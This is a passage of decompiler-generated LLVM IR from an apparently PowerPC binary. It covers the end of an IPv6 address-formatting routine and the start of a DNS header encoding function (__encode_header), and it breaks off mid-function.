  br i1 %v2_10016838, label %dec_label_pc_1001683c, label %dec_label_pc_100167e8

dec_label_pc_1001683c:                            ; preds = %dec_label_pc_10016834
  %v3_1001683c = icmp eq i32 %v0_1001682842, -1
  %v1_1001685c = icmp slt i32 %v0_1001681839, -1
  %v3_1001685c = icmp eq i32 %v0_1001681839, -1
  store i1 %v1_1001685c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001685c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001683c, label %dec_label_pc_1001685c, label %dec_label_pc_10016844

dec_label_pc_10016844:                            ; preds = %dec_label_pc_1001683c
  %v0_10016854.pre = load i32, i32* @r31, align 4
  br i1 %v3_1001685c, label %dec_label_pc_10016854, label %dec_label_pc_1001684c

dec_label_pc_1001684c:                            ; preds = %dec_label_pc_10016844
  %v1_1001684c = load i32, i32* @r30, align 4
  %v2_1001684c = icmp slt i32 %v0_10016854.pre, %v1_1001684c
  %v3_1001684c = icmp sgt i32 %v0_10016854.pre, %v1_1001684c
  %v4_1001684c = icmp eq i32 %v0_10016854.pre, %v1_1001684c
  store i1 %v2_1001684c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1001684c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001684c, label %dec_label_pc_10016854, label %dec_label_pc_1001685c.thread

dec_label_pc_10016854:                            ; preds = %dec_label_pc_10016844, %dec_label_pc_1001684c
  store i32 %v0_10016854.pre, i32* @r30, align 4
  store i32 %v0_1001682842, i32* @r28, align 4
  br label %dec_label_pc_1001685c.thread

dec_label_pc_1001685c.thread:                     ; preds = %dec_label_pc_10016854, %dec_label_pc_1001684c
  %v0_1001686476 = phi i32 [ %v1_1001684c, %dec_label_pc_1001684c ], [ %v0_10016854.pre, %dec_label_pc_10016854 ]
  %v0_1001685c.ph = phi i32 [ %v0_1001681839, %dec_label_pc_1001684c ], [ %v0_1001682842, %dec_label_pc_10016854 ]
  %v1_1001685c59 = icmp slt i32 %v0_1001685c.ph, -1
  %v3_1001685c61 = icmp eq i32 %v0_1001685c.ph, -1
  store i1 %v1_1001685c59, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001685c61, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_10016864

dec_label_pc_1001685c:                            ; preds = %dec_label_pc_1001683c
  br i1 %v3_1001685c, label %dec_label_pc_10016870, label %dec_label_pc_1001685c.dec_label_pc_10016864_crit_edge

dec_label_pc_1001685c.dec_label_pc_10016864_crit_edge: ; preds = %dec_label_pc_1001685c
  %v0_10016864.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10016864

dec_label_pc_10016864:                            ; preds = %dec_label_pc_1001685c.dec_label_pc_10016864_crit_edge, %dec_label_pc_1001685c.thread
  %v0_10016864 = phi i32 [ %v0_1001686476, %dec_label_pc_1001685c.thread ], [ %v0_10016864.pre, %dec_label_pc_1001685c.dec_label_pc_10016864_crit_edge ]
  %v0_1001685c62 = phi i32 [ %v0_1001685c.ph, %dec_label_pc_1001685c.thread ], [ %v0_1001681839, %dec_label_pc_1001685c.dec_label_pc_10016864_crit_edge ]
  %v1_10016864 = icmp slt i32 %v0_10016864, 1
  %v2_10016864 = icmp sgt i32 %v0_10016864, 1
  %v3_10016864 = icmp eq i32 %v0_10016864, 1
  store i1 %v1_10016864, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10016864, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10016864, label %dec_label_pc_10016870, label %dec_label_pc_1001686c

dec_label_pc_1001686c:                            ; preds = %dec_label_pc_10016864
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_10016870

dec_label_pc_10016870:                            ; preds = %dec_label_pc_10016864, %dec_label_pc_1001685c, %dec_label_pc_1001686c
  %v0_1001687c3 = phi i32 [ %v0_1001685c62, %dec_label_pc_10016864 ], [ -1, %dec_label_pc_1001685c ], [ -1, %dec_label_pc_1001686c ]
  %v2_10016870 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_10016870, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %v1_1001687c4 = icmp slt i32 %v0_1001687c3, -1
  %v3_1001687c6 = icmp eq i32 %v0_1001687c3, -1
  store i1 %v1_1001687c4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001687c6, i1* %cr7_eq.global-to-local, align 1
  %v2_100168ec = icmp slt i32 %tmp, 65535
  %v4_100168ec = icmp eq i32 %tmp, 65535
  br label %dec_label_pc_1001687c

dec_label_pc_1001687c:                            ; preds = %dec_label_pc_10016870, %dec_label_pc_10016948
  %v2_100168b8 = phi i32 [ %v2_10016870, %dec_label_pc_10016870 ], [ %v2_100168a051, %dec_label_pc_10016948 ]
  %v0_1001688c = phi i32 [ %v0_1001687c3, %dec_label_pc_10016870 ], [ %v0_1001687c, %dec_label_pc_10016948 ]
  %v0_100168ac = phi i32 [ 0, %dec_label_pc_10016870 ], [ %v1_10016948, %dec_label_pc_10016948 ]
  %v3_1001687c7 = phi i1 [ %v3_1001687c6, %dec_label_pc_10016870 ], [ %v3_1001687c, %dec_label_pc_10016948 ]
  br i1 %v3_1001687c7, label %dec_label_pc_100168ac, label %dec_label_pc_10016884

dec_label_pc_10016884:                            ; preds = %dec_label_pc_1001687c
  %v2_10016884 = icmp slt i32 %v0_100168ac, %v0_1001688c
  %v4_10016884 = icmp eq i32 %v0_100168ac, %v0_1001688c
  br i1 %v2_10016884, label %dec_label_pc_100168ac, label %dec_label_pc_1001688c

dec_label_pc_1001688c:                            ; preds = %dec_label_pc_10016884
  %v1_1001688c = load i32, i32* @r30, align 4
  %v2_1001688c = add i32 %v1_1001688c, %v0_1001688c
  %v2_10016890 = icmp slt i32 %v0_100168ac, %v2_1001688c
  %v4_10016890 = icmp eq i32 %v0_100168ac, %v2_1001688c
  store i1 %v2_10016890, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10016890, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10016890, label %dec_label_pc_10016898, label %dec_label_pc_100168ac

dec_label_pc_10016898:                            ; preds = %dec_label_pc_1001688c
  br i1 %v4_10016884, label %dec_label_pc_1001689c, label %dec_label_pc_10016948

dec_label_pc_1001689c:                            ; preds = %dec_label_pc_10016898
  %v3_100168a0 = inttoptr i32 %v2_100168b8 to i8*
  store i8 58, i8* %v3_100168a0, align 1
  %v0_100168a4 = load i32, i32* %r29.global-to-local, align 4
  %v1_100168a4 = add i32 %v0_100168a4, 1
  store i32 %v1_100168a4, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10016948

dec_label_pc_100168ac:                            ; preds = %dec_label_pc_1001688c, %dec_label_pc_10016884, %dec_label_pc_1001687c
  %v1_100168ac = icmp slt i32 %v0_100168ac, 0
  %v3_100168ac = icmp eq i32 %v0_100168ac, 0
  store i1 %v1_100168ac, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100168ac, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100168ac, label %dec_label_pc_100168c0.thread, label %dec_label_pc_100168c0

dec_label_pc_100168c0.thread:                     ; preds = %dec_label_pc_100168ac
  store i1 true, i1* %cr7_lt.global-to-local, align 1
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_10016924

dec_label_pc_100168c0:                            ; preds = %dec_label_pc_100168ac
  %v3_100168b8 = inttoptr i32 %v2_100168b8 to i8*
  store i8 58, i8* %v3_100168b8, align 1
  %v0_100168bc = load i32, i32* %r29.global-to-local, align 4
  %v1_100168bc = add i32 %v0_100168bc, 1
  store i32 %v1_100168bc, i32* %r29.global-to-local, align 4
  %v0_100168c0.pre = load i32, i32* @r31, align 4
  %v1_100168c0 = icmp slt i32 %v0_100168c0.pre, 6
  %v3_100168c0 = icmp eq i32 %v0_100168c0.pre, 6
  store i1 %v1_100168c0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100168c0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100168c0, label %dec_label_pc_100168c8, label %dec_label_pc_10016924

dec_label_pc_100168c8:                            ; preds = %dec_label_pc_100168c0
  %v0_100168c8 = load i32, i32* @r28, align 4
  %v1_100168c8 = icmp slt i32 %v0_100168c8, 0
  %v3_100168c8 = icmp eq i32 %v0_100168c8, 0
  store i1 %v1_100168c8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100168c8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100168c8, label %dec_label_pc_100168d0, label %dec_label_pc_10016924

dec_label_pc_100168d0:                            ; preds = %dec_label_pc_100168c8
  %v0_100168d0 = load i32, i32* @r30, align 4
  %v1_100168d0 = icmp slt i32 %v0_100168d0, 6
  %v3_100168d0 = icmp eq i32 %v0_100168d0, 6
  store i1 %v1_100168d0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100168d0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100168d0, label %dec_label_pc_100168f4, label %dec_label_pc_100168d8

dec_label_pc_100168d8:                            ; preds = %dec_label_pc_100168d0
  %v1_100168d8 = icmp slt i32 %v0_100168d0, 5
  %v3_100168d8 = icmp eq i32 %v0_100168d0, 5
  store i1 %v1_100168d8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100168d8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100168d8, label %dec_label_pc_100168e0, label %dec_label_pc_10016924

dec_label_pc_100168e0:                            ; preds = %dec_label_pc_100168d8
  store i32 %tmp, i32* %r9.global-to-local, align 4
  store i1 %v2_100168ec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100168ec, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_100168ec, label %dec_label_pc_100168f4, label %dec_label_pc_10016924

dec_label_pc_100168f4:                            ; preds = %dec_label_pc_100168e0, %dec_label_pc_100168d0
  %v1_100168f4 = load i32, i32* @r1, align 4
  %v2_100168f4 = sub i32 %v1_100168f4, %v1_100168bc
  %v0_100168f8 = load i32, i32* @r27, align 4
  %v1_100168f8 = add i32 %v0_100168f8, 12
  %v1_100168fc = add i32 %v2_100168f4, 86
  store i32 ptrtoint ([3 x i8]* @global_var_10016908.610 to i32), i32* @lr, align 4
  %v3_10016904 = call i32 @inet_ntop4(i32 %v1_100168f8, i32 %v1_100168bc, i32 %v1_100168fc)
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_1001690c = icmp slt i32 %v3_10016904, 0
  %v3_1001690c = icmp eq i32 %v3_10016904, 0
  store i1 %v1_1001690c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001690c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001690c, label %dec_label_pc_100169c4, label %dec_label_pc_10016914

dec_label_pc_10016914:                            ; preds = %dec_label_pc_100168f4
  %v0_10016914 = load i32, i32* @r29, align 4
  store i32 %v0_10016914, i32* @r3, align 4
  %v0_10016918 = call i32 @__GI_strlen()
  %v0_1001691c = load i32, i32* @r29, align 4
  %v2_1001691c = add i32 %v0_1001691c, %v0_10016918
  store i32 %v2_1001691c, i32* %r29.global-to-local, align 4
  %v0_1001695c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1001695c

dec_label_pc_10016924:                            ; preds = %dec_label_pc_100168c0.thread, %dec_label_pc_100168e0, %dec_label_pc_100168d8, %dec_label_pc_100168c8, %dec_label_pc_100168c0
  %v0_1001690066 = phi i32 [ %v2_100168b8, %dec_label_pc_100168c0.thread ], [ %v1_100168bc, %dec_label_pc_100168e0 ], [ %v1_100168bc, %dec_label_pc_100168d8 ], [ %v1_100168bc, %dec_label_pc_100168c8 ], [ %v1_100168bc, %dec_label_pc_100168c0 ]
  store i32 %v2_1001677c, i32* %r9.global-to-local, align 4
  store i32 %v0_1001690066, i32* @r3, align 4
  store i32 268527940, i32* @lr, align 4
  %v1_10016940 = call i32 @sprintf(i32 %v0_1001690066)
  %v0_10016944 = load i32, i32* @r29, align 4
  %v2_10016944 = add i32 %v0_10016944, %v1_10016940
  store i32 %v2_10016944, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10016948

dec_label_pc_10016948:                            ; preds = %dec_label_pc_10016898, %dec_label_pc_1001689c, %dec_label_pc_10016924
  %v2_100168a051 = phi i32 [ %v2_100168b8, %dec_label_pc_10016898 ], [ %v1_100168a4, %dec_label_pc_1001689c ], [ %v2_10016944, %dec_label_pc_10016924 ]
  %v0_10016948 = load i32, i32* @r31, align 4
  %v1_10016948 = add i32 %v0_10016948, 1
  store i32 %v1_10016948, i32* @r31, align 4
  %tmp73 = icmp slt i32 %v1_10016948, 8
  %v0_1001687c = load i32, i32* @r28, align 4
  %v1_1001687c = icmp slt i32 %v0_1001687c, -1
  %v3_1001687c = icmp eq i32 %v0_1001687c, -1
  store i1 %v1_1001687c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001687c, i1* %cr7_eq.global-to-local, align 1
  br i1 %tmp73, label %dec_label_pc_1001687c, label %dec_label_pc_10016954

dec_label_pc_10016954:                            ; preds = %dec_label_pc_10016948
  br i1 %v3_1001687c, label %dec_label_pc_10016974, label %dec_label_pc_1001695c

dec_label_pc_1001695c:                            ; preds = %dec_label_pc_10016954, %dec_label_pc_10016914
  %v2_1001696c = phi i32 [ %v2_100168a051, %dec_label_pc_10016954 ], [ %v2_1001691c, %dec_label_pc_10016914 ]
  %v0_1001695c = phi i32 [ %v0_1001687c, %dec_label_pc_10016954 ], [ %v0_1001695c.pre, %dec_label_pc_10016914 ]
  %v1_1001695c = load i32, i32* @r30, align 4
  %v2_1001695c = add i32 %v1_1001695c, %v0_1001695c
  %v1_10016960 = icmp slt i32 %v2_1001695c, 8
  %v3_10016960 = icmp eq i32 %v2_1001695c, 8
  store i1 %v1_10016960, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10016960, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10016960, label %dec_label_pc_10016968, label %dec_label_pc_10016974

dec_label_pc_10016968:                            ; preds = %dec_label_pc_1001695c
  %v3_1001696c = inttoptr i32 %v2_1001696c to i8*
  store i8 58, i8* %v3_1001696c, align 1
  %v0_10016970 = load i32, i32* %r29.global-to-local, align 4
  %v1_10016970 = add i32 %v0_10016970, 1
  store i32 %v1_10016970, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10016974

dec_label_pc_10016974:                            ; preds = %dec_label_pc_1001695c, %dec_label_pc_10016954, %dec_label_pc_10016968
  %v2_10016988 = phi i32 [ %v2_1001696c, %dec_label_pc_1001695c ], [ %v2_100168a051, %dec_label_pc_10016954 ], [ %v1_10016970, %dec_label_pc_10016968 ]
  %v1_10016974 = sub i32 1, %v2_10016870
  %v2_1001697c = add i32 %v1_10016974, %v2_10016988
  %v1_10016980 = load i32, i32* @r26, align 4
  %v2_10016980 = icmp ult i32 %v2_1001697c, %v1_10016980
  %v4_10016980 = icmp eq i32 %v2_1001697c, %v1_10016980
  store i1 %v2_10016980, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10016980, i1* %cr7_eq.global-to-local, align 1
  %v3_10016988 = inttoptr i32 %v2_10016988 to i8*
  store i8 0, i8* %v3_10016988, align 1
  %v0_1001698c = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_1001698c = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_1001698c = or i1 %v0_1001698c, %v1_1001698c
  br i1 %v2_1001698c, label %dec_label_pc_100169a4, label %dec_label_pc_10016990

dec_label_pc_10016990:                            ; preds = %dec_label_pc_10016974
  %v0_10016990 = call i32 @__errno_location()
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1001699c = inttoptr i32 %v0_10016990 to i32*
  store i32 28, i32* %v2_1001699c, align 4
  %v0_100169c8.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100169c4

dec_label_pc_100169a4:                            ; preds = %dec_label_pc_10016974
  %v0_100169a4 = load i32, i32* @r25, align 4
  %v2_100169a8 = bitcast i32* %stack_var_-88 to i8*
  %v3_100169a8 = call i32 @strcpy(i32 %v0_100169a4, i8* %v2_100169a8)
  br label %dec_label_pc_100169ac

dec_label_pc_100169ac:                            ; preds = %dec_label_pc_10016768, %dec_label_pc_100169a4
  %storemerge1 = phi i32 [ %v3_10016774, %dec_label_pc_10016768 ], [ %v3_100169a8, %dec_label_pc_100169a4 ]
  store i32 %storemerge1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100169c4

dec_label_pc_100169b4:                            ; preds = %dec_label_pc_1001675c
  %v0_100169b4 = call i32 @__errno_location()
  %v2_100169bc = inttoptr i32 %v0_100169b4 to i32*
  store i32 97, i32* %v2_100169bc, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100169c4

dec_label_pc_100169c4:                            ; preds = %dec_label_pc_100168f4, %dec_label_pc_100169ac, %dec_label_pc_10016990, %dec_label_pc_100169b4
  %v0_100169c8 = phi i32 [ 0, %dec_label_pc_100168f4 ], [ %storemerge1, %dec_label_pc_100169ac ], [ %v0_100169c8.pre, %dec_label_pc_10016990 ], [ 0, %dec_label_pc_100169b4 ]
  ret i32 %v0_100169c8

; uselistorder directives
  uselistorder i32 %v2_10016988, { 1, 0 }
  uselistorder i32 %v2_1001695c, { 1, 0 }
  uselistorder i1 %v3_1001687c, { 0, 2, 1 }
  uselistorder i32 %v0_1001687c, { 0, 2, 3, 1 }
  uselistorder i32 %v1_10016948, { 2, 1, 0 }
  uselistorder i32 %v0_1001690066, { 1, 0 }
  uselistorder i32 %v3_10016904, { 1, 0 }
  uselistorder i32 %v0_100168d0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_100168bc, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v2_1001688c, { 1, 0 }
  uselistorder i32 %v0_100168ac, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32 %v0_1001688c, { 0, 2, 1 }
  uselistorder i32 %v2_100168b8, { 3, 0, 1, 2 }
  uselistorder i32 %v0_1001687c3, { 0, 2, 1 }
  uselistorder i32 %v0_10016864, { 2, 1, 0 }
  uselistorder i32 %v0_10016854.pre, { 0, 1, 4, 3, 2 }
  uselistorder i1 %v3_1001685c, { 1, 0, 2 }
  uselistorder i32 %v1_10016838, { 2, 1, 0 }
  uselistorder i32 %v1_10016834, { 1, 0 }
  uselistorder i32 %v0_1001681839, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1001682842, { 0, 2, 1, 3 }
  uselistorder i1 %v3_100167ec, { 1, 0 }
  uselistorder i32 %v0_10016834, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v0_100167ec, { 1, 0 }
  uselistorder i32 %v0_10016818, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_10016828, { 2, 3, 0, 1 }
  uselistorder i32 %v1_100167c8, { 1, 0 }
  uselistorder i32 %v2_100167c0, { 1, 0 }
  uselistorder i32 %v0_100167b8, { 1, 0, 2 }
  uselistorder i32 %v1_100167a0, { 1, 0 }
  uselistorder i32 %v2_1001677c, { 1, 0, 2, 3 }
  uselistorder i32* %r29.global-to-local, { 0, 5, 1, 2, 3, 6, 4, 7, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 19, 9, 10, 17, 12, 18, 14, 13, 15, 16 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 19, 9, 10, 17, 12, 18, 14, 13, 15, 16 }
  uselistorder i32 97, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32* @r1, { 3, 5, 4, 1, 9, 0, 10, 2, 6, 7, 8, 11, 12, 13, 14 }
  uselistorder i1 true, { 6, 2, 8, 9, 3, 4, 5, 0, 7, 10, 1 }
  uselistorder i8 58, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32 65535, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @__GI_memset, { 24, 23, 12, 22, 5, 3, 11, 10, 2, 0, 4, 21, 20, 1, 6, 25, 19, 18, 17, 16, 15, 14, 7, 13, 9, 8 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_100169c4, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_100169ac, { 1, 0 }
  uselistorder label %dec_label_pc_10016974, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10016948, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10016924, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1001687c, { 1, 0 }
  uselistorder label %dec_label_pc_10016870, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10016854, { 1, 0 }
  uselistorder label %dec_label_pc_10016834, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10016830, { 1, 0 }
  uselistorder label %dec_label_pc_100167e8, { 1, 0 }
  uselistorder label %dec_label_pc_100167a0, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 -1, i32* %r7.global-to-local, align 4
  %tmp2 = icmp slt i32 %arg3, 12
  br i1 %tmp2, label %dec_label_pc_10016ac0, label %dec_label_pc_100169e8

dec_label_pc_100169e8:                            ; preds = %entry
  %tmp3 = inttoptr i32 %arg2 to i8*
  %v1_100169e8 = add i32 %tmp, 2
  %v2_100169e8 = inttoptr i32 %v1_100169e8 to i8*
  %v3_100169e8 = load i8, i8* %v2_100169e8, align 1
  %v4_100169e8 = zext i8 %v3_100169e8 to i32
  store i32 %v4_100169e8, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r7.global-to-local, align 4
  store i8 %v3_100169e8, i8* %tmp3, align 1
  %v2_100169f4 = load i32, i32* %arg1, align 4
  store i32 %v2_100169f4, i32* %r0.global-to-local, align 4
  %v1_100169f8 = trunc i32 %v2_100169f4 to i8
  %v4_100169f8 = add i32 %arg2, 1
  %v5_100169f8 = inttoptr i32 %v4_100169f8 to i8*
  store i8 %v1_100169f8, i8* %v5_100169f8, align 1
  %v1_100169fc = add i32 %tmp, 12
  %v2_100169fc = inttoptr i32 %v1_100169fc to i32*
  %v3_100169fc = load i32, i32* %v2_100169fc, align 4
  store i32 %v3_100169fc, i32* %r0.global-to-local, align 4
  %v1_10016a00 = add i32 %tmp, 16
  %v2_10016a00 = inttoptr i32 %v1_10016a00 to i32*
  %v3_10016a00 = load i32, i32* %v2_10016a00, align 4
  store i32 %v3_10016a00, i32* %r11.global-to-local, align 4
  %v1_10016a04 = add i32 %tmp, 4
  %v2_10016a04 = inttoptr i32 %v1_10016a04 to i32*
  %v3_10016a04 = load i32, i32* %v2_10016a04, align 4
  %v2_10016a08 = icmp ne i32 %v3_100169fc, 0
  %v5_10016a0c = zext i1 %v2_10016a08 to i32
  store i32 %v5_10016a0c, i32* %r10.global-to-local, align 4
  %v1_10016a10 = add i32 %tmp, 8
  %v2_10016a10 = inttoptr i32 %v1_10016a10 to i32*
  %v3_10016a10 = load i32, i32* %v2_10016a10, align 4
  %v2_10016a14 = icmp ne i32 %v3_10016a00, 0
  %v5_10016a18 = zext i1 %v2_10016a14 to i32
  %v1_10016a1c = add i32 %tmp, 20
  %v2_10016a1c = inttoptr i32 %v1_10016a1c to i32*
  %v3_10016a1c = load i32, i32* %v2_10016a1c, align 4
  store i32 %v3_10016a1c, i32* %r0.global-to-local, align 4
  %not.v2_10016a20 = icmp eq i32 %v3_10016a04, 0
  %v6_10016a24 = sext i1 %not.v2_10016a20 to i32
  store i32 %v5_10016a18, i32* %r11.global-to-local, align 4
  %v1_10016a2c = call i32 @__asm_rlwinm(i32 %v6_10016a24, i32 0, i32 24, i32 24)
  %v0_10016a30 = load i32, i32* %r10.global-to-local, align 4
  %v1_10016a30 = mul i32 %v0_10016a30, 4
  store i32 %v1_10016a30, i32* %r10.global-to-local, align 4
  %v1_10016a34 = call i32 @__asm_rlwinm(i32 %v3_10016a10, i32 3, i32 25, i32 28)
  store i32 %v1_10016a34, i32* @r8, align 4
  %v0_10016a38 = load i32, i32* %r0.global-to-local, align 4
  %v2_10016a38 = icmp ne i32 %v0_10016a38, 0
  %v5_10016a3c = zext i1 %v2_10016a38 to i32
  %v2_10016a40 = or i32 %v1_10016a30, %v1_10016a34
  store i32 %v2_10016a40, i32* @r10, align 4
  %v1_10016a44 = add i32 %v1_10016a2c, 128
  %v0_10016a48 = load i32, i32* %r11.global-to-local, align 4
  %v1_10016a48 = mul i32 %v0_10016a48, 2
  store i32 %v1_10016a48, i32* %r11.global-to-local, align 4
  %v2_10016a4c = or i32 %v2_10016a40, %v5_10016a3c
  store i32 %v2_10016a4c, i32* %r0.global-to-local, align 4
  %v2_10016a50 = or i32 %v2_10016a4c, %v1_10016a44
  %v2_10016a54 = or i32 %v2_10016a50, %v1_10016a48
  %v1_10016a58 = trunc i32 %v2_10016a54 to i8
  %v4_10016a58 = add i32 %arg2, 2
  %v5_10016a58 = inttoptr i32 %v4_10016a58 to i8*
  store i8 %v1_10016a58, i8* %v5_10016a58, align 1
  %v1_10016a5c = add i32 %tmp, 24
  %v2_10016a5c = inttoptr i32 %v1_10016a5c to i32*
  %v3_10016a5c = load i32, i32* %v2_10016a5c, align 4
  %v1_10016a60 = add i32 %tmp, 28
  %v2_10016a60 = inttoptr i32 %v1_10016a60 to i32*
  %v3_10016a60 = load i32, i32* %v2_10016a60, align 4
  store i32 %v3_10016a60, i32* %r0.global-to-local, align 4
  %not.v2_10016a64 = icmp eq i32 %v3_10016a5c, 0
  %v6_10016a68 = sext i1 %not.v2_10016a64 to i32
  %v1_10016a6c = call i32 @__asm_rlwinm(i32 %v6_10016a68, i32 0, i32 24, i32 24)
  %v1_10016a70 = urem i32 %v3_10016a60, 16
  store i32 %v1_10016a70, i32* %r0.global-to-local, align 4
  %v1_10016a74 = add i32 %v1_10016a6c, 128
  %v2_10016a78 = or i32 %v1_10016a70, %v1_10016a74
  %v1_10016a7c = trunc i32 %v2_10016a78 to i8
  %v4_10016a7c = add i32 %arg2, 3
  %v5_10016a7c = inttoptr i32 %v4_10016a7c to i8*
  store i8 %v1_10016a7c, i8* %v5_10016a7c, align 1
  %v1_10016a80 = add i32 %tmp, 34
  %v2_10016a80 = inttoptr i32 %v1_10016a80 to i8*
  %v3_10016a80 = load i8, i8* %v2_10016a80, align 1
  %v4_10016a80 = zext i8 %v3_10016a80 to i32
  store i32 %v4_10016a80, i32* %r0.global-to-local, align 4
  %v4_10016a84 = add i32 %arg2, 4
  %v5_10016a84 = inttoptr i32 %v4_10016a84 to i8*
  store i8 %v3_10016a80, i8* %v5_10016a84, align 1
  %v1_10016a88 = add i32 %tmp, 32
  %v2_10016a88 = inttoptr i32 %v1_10016a88 to i32*
  %v3_10016a88 = load i32, i32* %v2_10016a88, align 4
  store i32 %v3_10016a88, i32* %r0.global-to-local, align 4
  %v1_10016a8c = trunc i32 %v3_10016a88 to i8
  %v4_10016a8c = add i32 %arg2, 5
  %v5_10016a8c = inttoptr i32 %v4_10016a8c to i8*
  store i8 %v1_10016a8c, i8* %v5_10016a8c, align 1
  %v1_10016a90 = add i32 %tmp, 38
  %v2_10016a90 = inttoptr i32 %v1_10016a90 to i8*
  %v3_10016a90 = load i8, i8* %v2_10016a90, align 1
  %v4_10016a90 = zext i8 %v3_10016a90 to i32
  store i32 %v4_10016a90, i32* %r0.global-to-local, align 4
  %v4_10016a94 = add i32 %arg2, 6
  %v5_10016a94 = inttoptr i32 %v4_10016a94 to i8*
  store i8 %v3_10016a90, i8* %v5_10016a94, align 1
  %v1_10016a98 = add i32 %tmp, 36
  %v2_10016a98 = inttoptr i32 %v1_10016a98 to i32*
  %v3_10016a98 = load i32, i32* %v2_10016a98, align 4
  store i32 %v3_10016a98, i32* %r0.global-to-local, align 4
  %v1_10016a9c = trunc i32 %v3_10016a98 to i8
  %v4_10016a9c = add i32 %arg2, 7
  %v5_10016a9c = inttoptr i32 %v4_10016a9c to i8*
  store i8 %v1_10016a9c, i8* %v5_10016a9c, align 1
  %v1_10016aa0 = add i32 %tmp, 42
  %v2_10016aa0 = inttoptr i32 %v1_10016aa0 to i8*
  %v3_10016aa0 = load i8, i8* %v2_10016aa0, align 1
  %v4_10016aa0 = zext i8 %v3_10016aa0 to i32
  store i32 %v4_10016aa0, i32* %r0.global-to-local, align 4
  %v4_10016aa4 = add i32 %arg2, 8
  %v5_10016aa4 = inttoptr i32 %v4_10016aa4 to i8*
  store i8 %v3_10016aa0, i8* %v5_10016aa4, align 1
  %v1_10016aa8 = add i32 %tmp, 40
  %v2_10016aa8 = inttoptr i32 %v1_10016aa8 to i32*
  %v3_10016aa8 = load i32, i32* %v2_10016aa8, align 4
  store i32 %v3_10016aa8, i32* %r0.global-to-local, align 4
  %v1_10016aac = trunc i32 %v3_10016aa8 to i8
  %v4_10016aac = add i32 %arg2, 9
  %v5_10016aac = inttoptr i32 %v4_10016aac to i8*
  store i8 %v1_10016aac, i8* %v5_10016aac, align 1
  %v1_10016ab0 = add i32 %tmp, 46
  %v2_10016ab0 = inttoptr i32 %v1_10016ab0 to i8*
  %v3_10016ab0 = load i8, i8* %v2_10016ab0, align 1
  %v4_10016ab0 = zext i8 %v3_10016ab0 to i32
  store i32 %v4_10016ab0, i32* %r0.global-to-local, align 4
  %v4_10016ab4 = add i32 %arg2, 10
